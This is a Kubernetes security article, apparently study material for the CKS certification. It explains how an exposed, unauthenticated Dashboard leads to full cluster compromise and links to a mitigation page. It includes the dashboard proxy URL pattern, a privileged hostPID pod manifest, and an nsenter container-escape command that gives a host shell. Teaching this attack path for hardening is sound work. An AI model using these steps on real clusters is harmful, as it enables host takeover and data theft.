---
sidebar_position: 3
title: "Security Risks of Exposing Kubernetes Dashboard Publicly"
description: "Learn the security risks of exposing Kubernetes Dashboard publicly and how attackers exploit misconfigured dashboards for full cluster compromise."
keywords: [kubernetes dashboard security risks, exposing kubernetes dashboard publicly, securing kubernetes dashboard, kubernetes dashboard vulnerability, kubernetes dashboard authentication, dashboard cluster compromise, kubernetes UI security, exposed dashboard attack, kubernetes web interface security, CKS]
tags: [attack-vector, dashboard, authentication, CKS]
related:
  - /kubernetes-security/best-practices/cluster-setup-and-hardening/network-security/exposed-dashboard-mitigation/
  - /kubernetes-security/best-practices/cluster-setup-and-hardening/network-security/ingress-security/
  - /kubernetes-security/fundamentals/authentication/authentication-methods/
  - /kubernetes-security/attack-vectors/compromised-api-server/
---

# Security Risks of Exposing Kubernetes Dashboard Publicly

The **security risks of exposing Kubernetes Dashboard publicly** are severe. The Kubernetes Dashboard is a web-based interface for managing cluster resources and workloads. While helpful for development and debugging, exposing it publicly without proper authentication allows attackers to gain administrative control over the entire cluster.

This article covers the specific risks of an exposed Kubernetes Dashboard and demonstrates how attackers exploit these misconfigurations for full cluster compromise.

---

## Exploitation Steps: Full Cluster Compromise via Dashboard

### 1. Discover the Exposed Dashboard

The attacker scans for publicly accessible services and identifies the Kubernetes Dashboard exposed over HTTP or via a misconfigured Ingress or LoadBalancer:

```
http://<public-ip>:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/
```

If no authentication is required, the attacker gains direct access to the Dashboard UI.

### 2. Enumerate Available Capabilities

Within the Dashboard, the attacker checks whether they can:

- View secrets, namespaces, pods, and deployments
- Create new pods or services
- Execute commands in running containers

If the Dashboard is bound to a service account with `cluster-admin` privileges, all of these actions will be permitted.

### 3. Deploy a Privileged Pod

The attacker uses the Dashboard UI to create a pod with elevated access:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pwned
spec:
  containers:
    - name: shell
      image: alpine
      command: ["/bin/sh"]
      args: ["-c", "sleep infinity"]
      securityContext:
        privileged: true
  hostPID: true
  restartPolicy: Never
```

This pod runs in privileged mode with access to the host’s process namespace.

### 4. Escape the Container and Access the Host

Using the Dashboard’s Exec feature, the attacker enters the container and runs:

```bash
nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh
```

If successful, the attacker bypasses the container boundary and gains a shell on the underlying host node.

---

### Result

An attacker can:

- Interact directly with all Kubernetes resources using the Dashboard
- Deploy privileged containers to bypass isolation
- Escalate privileges to the host
- Exfiltrate data or disrupt workloads
- Fully compromise the cluster

This attack relies on a combination of insecure defaults, missing access controls, and excessive service account privileges.

---

## Mitigation

➡ [Exposed Dashboard Mitigation](/kubernetes-security/best-practices/cluster-setup-and-hardening/network-security/exposed-dashboard-mitigation)

---

## References

This article is based on information from the following official sources:

1. [Web UI (Dashboard)](https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard/) - Kubernetes Documentation
2. [Accessing Dashboard](https://github.com/kubernetes/dashboard/blob/master/docs/user/accessing-dashboard/README.md) - Kubernetes Dashboard GitHub
3. [Creating sample user](https://github.com/kubernetes/dashboard/blob/master/docs/user/access-control/creating-sample-user.md) - Kubernetes Dashboard GitHub
